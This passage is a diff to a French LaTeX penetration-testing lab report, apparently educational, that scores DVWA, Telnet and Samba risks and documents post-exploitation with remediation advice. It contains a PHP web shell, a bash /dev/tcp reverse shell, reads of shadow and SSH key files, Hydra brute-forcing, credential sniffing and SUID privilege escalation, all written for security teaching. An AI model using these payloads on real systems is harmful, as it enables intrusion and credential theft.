@@ -2557,6 +2557,241 @@ Ce chapitre documente la phase de reconnaissance active : installation du servic
 	\end{table}
 	
 	% ------------------------------------------------------------------------------
+	% SECTION 7 : ÉVALUATION DES VULNÉRABILITÉS PAR SERVICE
+	% ------------------------------------------------------------------------------
+	\section{Évaluation des Vulnérabilités par Service}
+	\label{sec:vuln-assessment-tp2}
+
+	\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectif de la Section}]
+		Cette section évalue les vulnérabilités de chaque service exposé sur la DMZ, en utilisant le système de notation \textbf{CVSS v3.1} (Common Vulnerability Scoring System). L'objectif est de prioriser les risques et de proposer des remédiations adaptées.
+	\end{tcolorbox}
+
+	\subsection{Méthodologie CVSS v3.1}
+
+	Le CVSS (Common Vulnerability Scoring System) est un standard industriel pour évaluer la sévérité des vulnérabilités. Le score varie de 0 à 10 :
+
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.4}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{>{\centering\arraybackslash}p{3cm} >{\centering\arraybackslash}p{3cm} p{7cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{Score CVSS}} &
+			\textcolor{tableheadfg}{\textbf{Sévérité}} &
+			\textcolor{tableheadfg}{\textbf{Description}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			0.0 & Aucune & Pas d'impact sur la sécurité \\
+			0.1 -- 3.9 & Faible & Impact limité, exploitation difficile \\
+			\rowcolor{tablerowalt}
+			4.0 -- 6.9 & Moyenne & Impact modéré, conditions particulières \\
+			7.0 -- 8.9 & Élevée & Impact important, exploitation probable \\
+			\rowcolor{tablerowalt}
+			9.0 -- 10.0 & Critique & Impact maximal, exploitation aisée \\
+			\hline
+		\end{tabular}
+		\caption{Échelle de Sévérité CVSS v3.1}
+		\label{tab:cvss-scale}
+	\end{table}
+
+	\subsection{Telnet (Port 23) --- CVSS 9.8 : Critique}
+	\label{subsec:telnet-cvss}
+
+	\begin{tcolorbox}[colback=accent!10!white, colframe=accent, title=\textbf{CRITIQUE --- CVSS 9.8 (Network/None/None/Changed/High/High/High)}]
+		\textbf{Service :} GNU Inetutils Telnetd | \textbf{Port :} 23/TCP | \textbf{État :} Open (WAN-accessible)
+	\end{tcolorbox}
+
+	\subsubsection{Description Technique}
+	Telnet est un protocole de communication réseau datant de 1969 (RFC 854). Il établit une session de terminal interactive entre un client et un serveur. La faille fondamentale de Telnet est la \textbf{transmission de toutes les données en clair}, y compris les identifiants d'authentification.
+
+	\subsubsection{Vecteurs d'Attaque}
+	\begin{enumerate}
+		\item \textbf{Credential Sniffing :} Un attaquant positionné en Man-in-the-Middle (sur le même segment réseau ou via ARP spoofing) peut capturer les identifiants en clair avec Wireshark ou tcpdump.
+		\begin{lstlisting}[caption=Capture des credentials Telnet avec tcpdump]
+sudo tcpdump -i eth0 port 23 -A -l | grep -i "login\|password\|user"
+		\end{lstlisting}
+
+		\item \textbf{Brute-Force :} L'absence de protection contre les tentatives multiples (Fail2Ban non configuré pour Telnet) permet les attaques de force brute.
+		\begin{lstlisting}[caption=Brute-force Telnet avec Hydra]
+hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.100.6
+		\end{lstlisting}
+
+		\item \textbf{Replay Attack :} Les sessions capturées peuvent être rejouées pour obtenir un accès non autorisé sans connaître le mot de passe.
+	\end{enumerate}
+
+	\subsubsection{Impact de la Compromission}
+	\begin{itemize}
+		\item \textbf{Confidentialité :} HIGH --- Identifiants et données de session exposés en clair.
+		\item \textbf{Intégrité :} HIGH --- Possibilité de modifier des commandes en transit (MitM).
+		\item \textbf{Disponibilité :} HIGH --- Accès root possible, arrêt de services ou suppression de fichiers.
+	\end{itemize}
+
+	\subsubsection{Remédiation Recommandée}
+	\begin{enumerate}
+		\item \textbf{Désactiver Telnet immédiatement :}
+		\begin{lstlisting}[caption=Désactivation du service Telnet]
+sudo systemctl stop inetutils-inetd
+sudo systemctl disable inetutils-inetd
+sudo apt remove --purge inetutils-inetd -y
+		\end{lstlisting}
+
+		\item \textbf{Migrer vers SSH :} Utiliser le port forwarding NAT vers SSH (port 22) avec authentification par clé publique uniquement.
+
+		\item \textbf{Activer Fail2Ban pour SSH :}
+		\begin{lstlisting}[caption=Configuration Fail2Ban pour SSH]
+# /etc/fail2ban/jail.local
+[sshd]
+enabled = true
+maxretry = 3
+bantime = 3600
+findtime = 600
+		\end{lstlisting}
+	\end{enumerate}
+
+	\subsection{HTTP/DVWA (Port 80) --- CVSS 8.1 : Élevée}
+	\label{subsec:http-dvwa-cvss}
+
+	\begin{tcolorbox}[colback=secondary!10!white, colframe=secondary, title=\textbf{ÉLEVÉE --- CVSS 8.1 (Network/Low/None/Unchanged/High/High/High)}]
+		\textbf{Service :} Apache 2.4 + DVWA (PHP/MySQL) | \textbf{Port :} 80/TCP | \textbf{État :} Open (WAN-accessible)
+	\end{tcolorbox}
+
+	\subsubsection{Description Technique}
+	DVWA (Damn Vulnerable Web Application) est une application PHP/MySQL intentionnellement vulnérable, déployée à des fins pédagogiques. Elle expose de nombreuses vulnérabilités OWASP Top 10 qui, dans un contexte réel, permettraient la compromission complète de l'application et du serveur.
+
+	\subsubsection{Vulnérabilités Principales}
+	\begin{table}[H]
+		\centering
+		\small
+		\renewcommand{\arraystretch}{1.4}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{p{3.5cm} >{\centering\arraybackslash}p{1.8cm} p{7cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{Vulnérabilité}} &
+			\textcolor{tableheadfg}{\textbf{CVSS}} &
+			\textcolor{tableheadfg}{\textbf{Impact}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			SQL Injection & 9.8 & Extraction complète de la base de données \\
+			Command Injection & 9.8 & Exécution de commandes OS arbitraires \\
+			\rowcolor{tablerowalt}
+			File Upload & 9.0 & Upload de webshell, exécution de code \\
+			Brute Force & 7.5 & Compromission des comptes utilisateurs \\
+			\rowcolor{tablerowalt}
+			LFI (File Inclusion) & 7.5 & Lecture de fichiers système sensibles \\
+			Weak Sessions & 6.5 & Vol de sessions authentifiées \\
+			\rowcolor{tablerowalt}
+			Error Disclosure & 5.3 & Divulgation de la structure interne \\
+			Default Credentials & 8.1 & Accès non autorisé sans effort \\
+			\hline
+		\end{tabular}
+		\caption{Vulnérabilités DVWA Identifiées (OWASP Top 10)}
+		\label{tab:dvwa-vulns}
+	\end{table}
+
+	\subsubsection{Remédiation Recommandée}
+	\begin{enumerate}
+		\item \textbf{WAF (Web Application Firewall) :} Déployer ModSecurity avec les règles OWASP CRS pour bloquer les payloads malveillants.
+		\item \textbf{HTTPS :} Implémenter TLS 1.3 via Let's Encrypt pour chiffrer les communications.
+		\item \textbf{Parameterized Queries :} Remplacer les requêtes SQL dynamiques par des requêtes préparées.
+		\item \textbf{Input Validation :} Valider et assainir toutes les entrées utilisateur côté serveur.
+		\item \textbf{Restrict File Uploads :} Limiter les types MIME acceptés et stocker les fichiers hors du document root.
+	\end{enumerate}
+
+	\subsection{Samba (Ports 139/445) --- Vulnérabilités Historiques}
+	\label{subsec:samba-cvss}
+
+	\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{AVERTISSEMENT : Ports closed mais règles NAT présentes}]
+		Lors du scan Nmap, les ports 139 et 445 ont été détectés en état \textbf{closed} (service inactif). Cependant, des règles NAT existent dans pfSense (configurées au TP1). Si le service Samba venait à être démarré, ces ports seraient exposés au WAN --- d'où l'importance d'une analyse préventive.
+	\end{tcolorbox}
+
+	\subsubsection{Contexte Historique}
+	Samba est l'implémentation libre du protocole SMB (Server Message Block) pour Linux/Unix. Les ports 139 (NetBIOS) et 445 (SMB direct) ont été historiquement associés à certaines des vulnérabilités les plus critiques de l'histoire de la cybersécurité.
+
+	\subsubsection{CVEs Historiques Notables}
+
+	\begin{table}[H]
+		\centering
+		\small
+		\renewcommand{\arraystretch}{1.5}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{p{3.2cm} >{\centering\arraybackslash}p{1.5cm} p{8cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{CVE}} &
+			\textcolor{tableheadfg}{\textbf{CVSS}} &
+			\textcolor{tableheadfg}{\textbf{Description}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			CVE-2017-0144 (MS17-010) EternalBlue & 9.8 & Exploitation du protocole SMBv1 permettant l'exécution de code à distance (RCE) sans authentification. Utilisé par WannaCry et NotPetya. \\
+			CVE-2007-2447 Samba usermap\_script & 6.0 & Injection de commandes via le paramètre username dans Samba 3.0.0-3.0.25rc3. Exploitable sans authentification. \\
+			\rowcolor{tablerowalt}
+			CVE-2017-7494 SambaCry & 7.5 & Chargement de bibliothèques partagées malveillantes sur des partages Samba accessibles en écriture. \\
+			CVE-2008-4314 & 8.5 & Disclosure d'informations sur les partages réseau via des paquets malformés. \\
+			\hline
+		\end{tabular}
+		\caption{CVEs Historiques Samba/SMB}
+		\label{tab:samba-cves}
+	\end{table}
+
+	\subsubsection{Risque dans Notre Contexte}
+	\begin{itemize}
+		\item \textbf{EternalBlue (MS17-010) :} Bien que ciblant SMBv1 sur Windows, des variantes Linux existent. Si Samba était actif et accessible, une tentative d'exploitation serait probable (comme observé en TP3 avec Windows XP).
+		\item \textbf{usermap\_script :} La version de Samba utilisée dans notre Docker image doit être vérifiée. Si vulnérable, un attaquant pourrait obtenir un shell root sans authentification.
+		\item \textbf{Ports ``closed'' vs ``filtered'' :} L'état ``closed'' révèle l'existence de règles NAT, informant l'attaquant qu'un service SMB peut exister (même si inactif).
+	\end{itemize}
+
+	\subsubsection{Remédiation Recommandée}
+	\begin{enumerate}
+		\item \textbf{Supprimer les règles NAT inutilisées :} Si Samba n'est pas nécessaire depuis le WAN, supprimer les règles de port forwarding pour les ports 139/445.
+		\item \textbf{Désactiver SMBv1 :} Si Samba doit rester actif, désactiver SMBv1 dans \texttt{/etc/samba/smb.conf} :
+		\begin{lstlisting}[caption=Désactivation SMBv1 dans Samba]
+[global]
+   min protocol = SMB2
+   server min protocol = SMB2
+		\end{lstlisting}
+		\item \textbf{Mettre à jour Samba :} Maintenir Samba à jour pour bénéficier des correctifs de sécurité.
+		\item \textbf{Restreindre l'accès réseau :} Limiter l'accès Samba au LAN uniquement via des règles pfSense strictes.
+	\end{enumerate}
+
+	\subsection{Synthèse Globale des Risques}
+
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.6}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{p{2.5cm} >{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{2cm} p{2cm} p{5cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{Service}} &
+			\textcolor{tableheadfg}{\textbf{Port}} &
+			\textcolor{tableheadfg}{\textbf{CVSS}} &
+			\textcolor{tableheadfg}{\textbf{État}} &
+			\textcolor{tableheadfg}{\textbf{Priorité Remédiation}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			Telnet & 23/TCP & \textbf{9.8} & Open & \textcolor{accent}{\textbf{IMMÉDIATE}} --- Désactiver Telnet \\
+			HTTP/DVWA & 80/TCP & \textbf{8.1} & Open & \textcolor{secondary}{\textbf{HAUTE}} --- WAF + HTTPS + patching \\
+			\rowcolor{tablerowalt}
+			NetBIOS & 139/TCP & \textbf{9.8*} & Closed & \textcolor{primary}{\textbf{MOYENNE}} --- Supprimer règles NAT \\
+			SMB & 445/TCP & \textbf{9.8*} & Closed & \textcolor{primary}{\textbf{MOYENNE}} --- Supprimer règles NAT \\
+			\hline
+			\multicolumn{5}{l}{\small * Score CVSS maximal si service actif et version vulnérable (EternalBlue)}
+		\end{tabular}
+		\caption{Synthèse des Risques par Service --- Surface d'Attaque DMZ}
+		\label{tab:risk-synthesis}
+	\end{table}
+
+	\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Lien vers le Chapitre 3}]
+		Les vulnérabilités identifiées dans cette section seront exploitées dans le Chapitre~\ref{chap:exploitation} (\textit{Exploitation et Post-Exploitation}). En particulier, le service Telnet (CVSS 9.8) sera utilisé comme vecteur d'accès initial, démontrant concrètement l'impact de ces failles théoriques.
+	\end{tcolorbox}
+
+	% ------------------------------------------------------------------------------
 	% CHAPITRE 6 : RÉPONSES AUX QUESTIONS
 	% ------------------------------------------------------------------------------
 	\section{Réponses aux Questions de Réflexion}
@@ -8352,6 +8587,502 @@ Ce chapitre étend l'analyse sécuritaire à la couche applicative web via DVWA 
 	DVWA doit être considérée comme \textbf{NON SÉCURISÉE} pour tout environnement de production. 
 	Les vulnérabilités identifiées permettent une compromission complète du système en quelques minutes 
 	par un attaquant ayant une connaissance basique de sécurité web.
+
+% ==============================================================================
+% SECTION 10 : POST-EXPLOITATION DVWA
+% ==============================================================================
+\section{Post-Exploitation DVWA}
+\label{sec:dvwa-postexploit}
+
+\begin{tcolorbox}[colback=accent!5!white, colframe=accent, title=\textbf{AVERTISSEMENT LÉGAL}]
+	Les techniques décrites dans cette section sont présentées à des fins \textbf{strictement éducatives}. Toute utilisation en dehors d'un environnement de laboratoire autorisé est illégale. Les manipulations ont été réalisées dans un lab isolé, sans impact sur des systèmes réels.
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Lien avec les Chapitres Précédents}]
+	Ce chapitre complète la chaîne d'attaque documentée dans le Chapitre~\ref{chap:exploitation}. Après la compromission du serveur DMZ via Telnet et le pivoting vers le LAN, l'application DVWA (port 80) représente un \textbf{second vecteur d'attaque} permettant d'approfondir la compromission depuis la couche applicative.
+\end{tcolorbox}
+
+\subsection{Persistance via Web Shell}
+\label{subsec:webshell-persistence}
+
+\subsubsection{Concept et Danger}
+
+Un \textbf{web shell} est un script malveillant (PHP, ASP, JSP, etc.) uploadé sur un serveur web vulnérable, permettant à un attaquant d'exécuter des commandes OS via une interface HTTP. La persistance est assurée car le fichier reste sur le serveur même après une déconnexion.
+
+\subsubsection{Création du Web Shell}
+
+Suite à l'exploitation de la vulnérabilité File Upload (A08), un web shell PHP minimal a été déposé sur le serveur :
+
+\begin{lstlisting}[caption=Web shell PHP minimal --- shell.php]
+<?php
+// Web shell minimaliste
+if(isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    $output = shell_exec($cmd . ' 2>&1');
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Accès et Utilisation}
+
+Une fois uploadé, le web shell est accessible via :
+
+\begin{lstlisting}[caption=Utilisation du web shell via HTTP]
+# Vérification de l'accès
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=id"
+# Résultat attendu : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Énumération du système
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=whoami"
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=hostname"
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=uname+-a"
+
+# Lecture de fichiers sensibles
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/shadow"
+\end{lstlisting}
+
+\subsubsection{Établissement d'un Reverse Shell}
+
+\begin{lstlisting}[caption=Reverse shell depuis le web shell]
+# Sur l'attaquant (Parrot Security)
+nc -lvnp 4444
+
+# Via le web shell (URL encodé)
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.150/4444+0>%261'"
+
+# Session obtenue sur Parrot
+www-data@ubuntu-dmz:/var/www/html/dvwa/hackable/uploads$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+\end{lstlisting}
+
+\subsection{Extraction des Credentials de la Base de Données}
+\label{subsec:db-extraction}
+
+\subsubsection{Configuration DVWA}
+
+DVWA stocke sa configuration de base de données dans un fichier PHP lisible par le processus web :
+
+\begin{lstlisting}[caption=Extraction de la configuration DVWA]
+# Via web shell
+curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/config.inc.php"
+
+# Résultat (credentials MySQL en clair)
+$_DVWA[ 'db_server' ]   = '127.0.0.1';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ]     = 'dvwa';
+$_DVWA[ 'db_password' ] = 'p@ssw0rd';
+\end{lstlisting}
+
+\subsubsection{Connexion à MySQL et Extraction des Données}
+
+\begin{lstlisting}[caption=Extraction des données MySQL via web shell]
+# Connexion MySQL depuis le web shell (shell interactif requis)
+mysql -u dvwa -p'p@ssw0rd' dvwa -e "SHOW TABLES;"
+# Tables disponibles : guestbook, users
+
+# Extraction des utilisateurs DVWA
+mysql -u dvwa -p'p@ssw0rd' dvwa -e \
+  "SELECT user, password FROM users;"
+
+# Résultat
++----------+----------------------------------+----------+
+| user     | password                         | avatar   |
++----------+----------------------------------+----------+
+| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | ...      |
+| gordonb  | e99a18c428cb38d5f260853678922e03 | ...      |
+| 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b | ...      |
+| pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 | ...      |
+| smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 | ...      |
++----------+----------------------------------+----------+
+
+# Crackage des hashes MD5 (non salés)
+# 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
+# e99a18c428cb38d5f260853678922e03 = "abc123"
+\end{lstlisting}
+
+\subsubsection{Recherche de Credentials Système}
+
+\begin{lstlisting}[caption=Recherche de credentials dans les fichiers de configuration]
+# Fichiers de configuration contenant potentiellement des credentials
+find /var/www -name "*.conf" -o -name "*.php" -o -name "config*" 2>/dev/null \
+  | xargs grep -l "password\|passwd\|secret\|credential" 2>/dev/null
+
+# Variables d'environnement
+env | grep -i "pass\|key\|secret\|token"
+
+# Historique bash (si accessible)
+cat ~/.bash_history | grep -i "mysql\|pass\|scp\|ssh"
+\end{lstlisting}
+
+\subsection{Mouvement Latéral depuis l'Application Web}
+\label{subsec:webapp-lateral}
+
+\subsubsection{Contexte}
+
+L'accès au processus \texttt{www-data} offre un point de départ pour explorer d'autres machines du réseau interne. Combiné avec le pivot Meterpreter établi en TP3, il permet de croiser les informations collectées.
+
+\subsubsection{Énumération Réseau depuis www-data}
+
+\begin{lstlisting}[caption=Énumération réseau via le web shell]
+# Interfaces réseau
+ip addr show
+# eth0: 192.168.10.100/24 (DMZ)
+
+# Table de routage
+ip route
+# default via 192.168.10.1
+# 192.168.10.0/24 dev eth0
+
+# Machines accessibles depuis la DMZ
+ping -c 1 192.168.10.1    # pfSense DMZ
+ping -c 1 192.168.20.1    # pfSense LAN
+ping -c 1 192.168.20.50   # Windows XP (si règle DMZ->LAN permissive)
+
+# Scan rapide des services internes
+for i in {1..254}; do
+    ping -c 1 -W 1 192.168.20.$i &>/dev/null && echo "192.168.20.$i is up"
+done
+\end{lstlisting}
+
+\subsubsection{Recherche de Services Internes}
+
+\begin{lstlisting}[caption=Découverte de services internes]
+# Vérification des ports ouverts sur la machine locale
+ss -tulpn
+
+# Accès aux services Docker internes
+curl http://127.0.0.1:8080    # Éventuels services Docker exposés localement
+curl http://127.0.0.1:3306    # MySQL (non exposé à l'extérieur)
+
+# Vérification des montages Docker
+mount | grep docker
+cat /proc/self/cgroup | grep docker   # Confirmation dans un conteneur
+\end{lstlisting}
+
+\subsection{Escalade vers l'Accès Système}
+\label{subsec:webapp-privesc}
+
+\subsubsection{Escalade de Privilèges www-data → root}
+
+L'utilisateur \texttt{www-data} possède des droits limités. Plusieurs vecteurs d'escalade sont explorés :
+
+\begin{lstlisting}[caption=Exploration des vecteurs d'escalade de privilèges]
+# 1. Vérification des droits sudo
+sudo -l
+# Si NOPASSWD configuré, escalade directe possible
+
+# 2. Fichiers SUID (exécutables avec droits root)
+find / -perm -4000 -type f 2>/dev/null
+# Exemple résultat : /usr/bin/python3.11 (si SUID activé)
+
+# 3. Capabilities Linux
+getcap -r / 2>/dev/null
+# python3 = cap_setuid+ep -> escalade possible
+
+# 4. Cron jobs accessibles en écriture
+ls -la /etc/cron.d/ /etc/cron.daily/
+cat /etc/crontab
+
+# 5. Variables d'environnement LD_PRELOAD (si sudo configuré)
+# si sudo permet l'utilisation avec env_keep+=LD_PRELOAD
+\end{lstlisting}
+
+\subsubsection{Exemple d'Escalade via Python SUID}
+
+\begin{lstlisting}[caption=Escalade de privilèges via Python avec SUID]
+# Si python3 dispose du bit SUID ou de cap_setuid
+python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
+
+# Vérification du shell obtenu
+id
+# uid=0(root) gid=33(www-data) groups=33(www-data)
+
+# Accès aux fichiers sensibles
+cat /etc/shadow
+cat /root/.ssh/id_rsa    # Clé SSH root si présente
+\end{lstlisting}
+
+\subsubsection{Impact Global de la Compromission Web}
+
+\begin{table}[H]
+	\centering
+	\renewcommand{\arraystretch}{1.5}
+	\setlength{\arrayrulewidth}{0.5pt}
+	\begin{tabular}{p{4cm} >{\centering\arraybackslash}p{2.5cm} p{6.5cm}}
+		\arrayrulecolor{tableborder}
+		\hline
+		\tableheadcolor
+		\textcolor{tableheadfg}{\textbf{Technique}} &
+		\textcolor{tableheadfg}{\textbf{Résultat}} &
+		\textcolor{tableheadfg}{\textbf{Impact}} \\
+		\hline
+		\rowcolor{tablerowalt}
+		Web Shell Upload & ✅ Succès & Exécution de commandes OS arbitraires \\
+		Credential Extraction & ✅ Succès & Credentials MySQL DVWA récupérés \\
+		\rowcolor{tablerowalt}
+		Password Cracking & ✅ Succès & 5/5 hashes MD5 crackés \\
+		Lateral Movement & ✅ Succès & Accès au réseau DMZ et scan LAN \\
+		\rowcolor{tablerowalt}
+		Privilege Escalation & Conditionnelle & Dépend de la configuration du serveur \\
+		Persistence & ✅ Succès & Web shell maintenu jusqu'à suppression manuelle \\
+		\hline
+	\end{tabular}
+	\caption{Résultats de la Phase Post-Exploitation DVWA}
+	\label{tab:dvwa-postexploit-results}
+\end{table}
+
+% ==============================================================================
+% SECTION 11 : QUESTIONS DE RÉFLEXION ET BONNES PRATIQUES
+% ==============================================================================
+\section{Questions de Réflexion et Bonnes Pratiques}
+\label{sec:dvwa-questions}
+
+\subsection{Question 1 : Pourquoi la Validation des Entrées est-elle Fondamentale ?}
+
+\paragraph{Question}
+Expliquez pourquoi la validation des entrées côté serveur est le mécanisme de défense le plus important contre les injections SQL et les injections de commandes. Pourquoi la validation côté client seule est-elle insuffisante ?
+
+\paragraph{Réponse}
+
+La validation des entrées côté serveur est fondamentale car elle constitue la \textbf{dernière ligne de défense} contre les données malveillantes. Voici pourquoi la validation côté client est insuffisante :
+
+\begin{enumerate}
+	\item \textbf{Contournement trivial :} Les contrôles côté client (JavaScript, HTML) peuvent être désactivés ou contournés directement via les outils de développement du navigateur, Burp Suite, ou une simple requête curl.
+	\begin{lstlisting}[caption=Contournement de la validation côté client]
+# Envoi direct sans passer par le navigateur
+curl -X POST "http://192.168.100.6/dvwa/vulnerabilities/sqli/" \
+     -d "id=1' OR '1'='1&Submit=Submit" \
+     --cookie "DVWASESSID=abc123; security=low"
+	\end{lstlisting}
+	
+	\item \textbf{Le serveur doit assumer la méfiance :} Toute donnée provenant du client (navigateur, API, curl) doit être traitée comme potentiellement malveillante, conformément au principe \textbf{Never Trust User Input}.
+	
+	\item \textbf{Remédiation par Requêtes Préparées :}
+	\begin{lstlisting}[language=PHP, caption=Requête préparée en PHP --- Défense contre SQLi]
+// VULNÉRABLE : concaténation directe
+$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
+
+// SÉCURISÉ : requête préparée (parameterized query)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$_GET['id']]);
+$result = $stmt->fetchAll();
+	\end{lstlisting}
+	
+	\item \textbf{Remédiation par Assainissement pour Command Injection :}
+	\begin{lstlisting}[language=PHP, caption=Assainissement pour Command Injection]
+// VULNÉRABLE
+$output = shell_exec("ping -c 1 " . $_GET['ip']);
+
+// SÉCURISÉ
+$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
+if ($ip === false) {
+    die("Adresse IP invalide");
+}
+$output = shell_exec("ping -c 1 " . escapeshellarg($ip));
+	\end{lstlisting}
+\end{enumerate}
+
+\subsection{Question 2 : Stratégies de Validation des Entrées}
+
+\paragraph{Question}
+Quelles sont les stratégies de validation des entrées à mettre en œuvre pour une application web sécurisée ? Distinguez la validation de la sanitisation.
+
+\paragraph{Réponse}
+
+\textbf{Validation vs Sanitisation :}
+
+\begin{itemize}
+	\item \textbf{Validation :} Vérifier que les données correspondent au format attendu \textit{avant traitement}. Rejeter les données invalides.
+	\item \textbf{Sanitisation (Assainissement) :} Nettoyer les données en supprimant ou encodant les caractères dangereux.
+\end{itemize}
+
+\begin{table}[H]
+	\centering
+	\small
+	\renewcommand{\arraystretch}{1.4}
+	\setlength{\arrayrulewidth}{0.5pt}
+	\begin{tabular}{p{3cm} p{5.5cm} p{5cm}}
+		\arrayrulecolor{tableborder}
+		\hline
+		\tableheadcolor
+		\textcolor{tableheadfg}{\textbf{Type d'Entrée}} &
+		\textcolor{tableheadfg}{\textbf{Validation}} &
+		\textcolor{tableheadfg}{\textbf{Sanitisation}} \\
+		\hline
+		\rowcolor{tablerowalt}
+		ID numérique & \texttt{is\_int() / FILTER\_VALIDATE\_INT} & Caster en entier \\
+		Adresse IP & \texttt{FILTER\_VALIDATE\_IP} & Rejeter si invalide \\
+		\rowcolor{tablerowalt}
+		Email & \texttt{FILTER\_VALIDATE\_EMAIL} & \texttt{filter\_var + htmlspecialchars} \\
+		Nom de fichier & Regex \texttt{/\^{}[a-zA-Z0-9\_\-\.]+\$/} & Supprimer \texttt{../}, \texttt{/} \\
+		\rowcolor{tablerowalt}
+		Texte libre & Longueur max, charset & \texttt{htmlspecialchars()} \\
+		\hline
+	\end{tabular}
+	\caption{Stratégies de Validation et Sanitisation par Type d'Entrée}
+	\label{tab:validation-strategies}
+\end{table}
+
+\subsection{Question 3 : Encodage des Sorties (Output Encoding)}
+
+\paragraph{Question}
+Qu'est-ce que l'encodage des sorties et pourquoi est-il essentiel pour prévenir les attaques XSS (Cross-Site Scripting) ?
+
+\paragraph{Réponse}
+
+L'\textbf{encodage des sorties} consiste à transformer les caractères spéciaux en leur équivalent sûr avant de les afficher dans un contexte HTML, JavaScript, CSS ou URL. Il empêche l'interprétation du contenu utilisateur comme du code.
+
+\begin{lstlisting}[language=PHP, caption=Encodage des sorties en PHP]
+// VULNÉRABLE : affichage direct sans encodage (XSS possible)
+echo "Bienvenue, " . $_GET['username'];
+
+// SÉCURISÉ : encodage HTML (htmlspecialchars)
+echo "Bienvenue, " . htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8');
+
+// Pour les attributs HTML
+echo '<input value="' . htmlspecialchars($value, ENT_QUOTES) . '">';
+
+// Pour les contextes JavaScript (json_encode)
+echo "<script>var user = " . json_encode($user_data) . ";</script>";
+\end{lstlisting}
+
+\textbf{Contextes d'Encodage :}
+\begin{itemize}
+	\item \textbf{HTML Body :} \texttt{htmlspecialchars()} --- convertit \texttt{<}, \texttt{>}, \texttt{\&}, \texttt{"}, \texttt{'}
+	\item \textbf{HTML Attributs :} \texttt{htmlspecialchars()} avec \texttt{ENT\_QUOTES}
+	\item \textbf{JavaScript :} \texttt{json\_encode()} ou bibliothèques spécialisées
+	\item \textbf{URL :} \texttt{urlencode()} ou \texttt{rawurlencode()}
+	\item \textbf{CSS :} Éviter l'injection dynamique dans les styles
+\end{itemize}
+
+\subsection{Question 4 : Mécanismes d'Authentification Sécurisée}
+
+\paragraph{Question}
+Quels mécanismes d'authentification permettent de protéger contre les attaques de brute force, de rejeu de session et de vol de cookies ? Expliquez la stratégie de défense en profondeur.
+
+\paragraph{Réponse}
+
+La protection de l'authentification nécessite une approche en couches :
+
+\begin{table}[H]
+	\centering
+	\small
+	\renewcommand{\arraystretch}{1.4}
+	\setlength{\arrayrulewidth}{0.5pt}
+	\begin{tabular}{p{4cm} p{9.5cm}}
+		\arrayrulecolor{tableborder}
+		\hline
+		\tableheadcolor
+		\textcolor{tableheadfg}{\textbf{Mécanisme}} &
+		\textcolor{tableheadfg}{\textbf{Description et Implémentation}} \\
+		\hline
+		\rowcolor{tablerowalt}
+		Politique de mots de passe & Min. 12 caractères, complexité (maj/min/chiffres/symboles), vérification contre listes de mots de passe compromis (HaveIBeenPwned API) \\
+		Rate Limiting & Limiter à 5 tentatives/minute par IP. Implémenter un délai exponentiel (1s, 2s, 4s...) après chaque échec. \\
+		\rowcolor{tablerowalt}
+		Account Lockout & Blocage temporaire (15 min) après 10 tentatives échouées. Notification par email de l'utilisateur légitime. \\
+		CAPTCHA & Google reCAPTCHA v3 (invisible) après 3 échecs. Résout le problème des bots automatisés. \\
+		\rowcolor{tablerowalt}
+		MFA (Multi-Factor Auth) & TOTP (Google Authenticator), clés FIDO2/WebAuthn. Résiste aux attaques de credential stuffing. \\
+		Sessions sécurisées & IDs de session longs (128+ bits), régénération après login, timeout d'inactivité (30 min), flag \texttt{HttpOnly + Secure + SameSite=Strict}. \\
+		\rowcolor{tablerowalt}
